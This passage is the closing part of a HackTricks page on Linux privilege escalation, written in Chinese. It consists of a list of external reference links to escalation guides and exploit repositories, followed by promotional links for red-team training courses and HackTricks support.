<li><a href="https://payatu.com/guide-linux-privilege-escalation/">https://payatu.com/guide-linux-privilege-escalation/</a>\</li>
<li><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744</a>\</li>
<li><a href="http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html">http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html</a>\</li>
<li><a href="https://touhidshaikh.com/blog/?p=827">https://touhidshaikh.com/blog/?p=827</a>\</li>
<li><a href="https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf">https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf</a>\</li>
<li><a href="https://github.com/frizb/Linux-Privilege-Escalation">https://github.com/frizb/Linux-Privilege-Escalation</a>\</li>
<li><a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a>\</li>
<li><a href="https://github.com/rtcrowley/linux-private-i">https://github.com/rtcrowley/linux-private-i</a></li>
<li><a href="https://www.linux.com/news/what-socket/">https://www.linux.com/news/what-socket/</a></li>
<li><a href="https://muzec0318.github.io/posts/PG/peppo.html">https://muzec0318.github.io/posts/PG/peppo.html</a></li>
<li><a href="https://www.linuxjournal.com/article/7744">https://www.linuxjournal.com/article/7744</a></li>
<li><a href="https://blog.certcube.com/suid-executables-linux-privilege-escalation/">https://blog.certcube.com/suid-executables-linux-privilege-escalation/</a></li>
<li><a href="https://juggernaut-sec.com/sudo-part-2-lpe">https://juggernaut-sec.com/sudo-part-2-lpe</a></li>
<li><a href="https://linuxconfig.org/how-to-manage-acls-on-linux">https://linuxconfig.org/how-to-manage-acls-on-linux</a></li>
<li><a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></li>
<li><a href="https://www.linode.com/docs/guides/what-is-systemd/">https://www.linode.com/docs/guides/what-is-systemd/</a></li>
</ul>
<p>{% hint style="success" %}
学习与实践 AWS 黑客攻击：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客攻击： <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../linux-hardening/linux-privilege-escalation-checklist.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/write-to-root.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../linux-hardening/linux-privilege-escalation-checklist.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/write-to-root.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
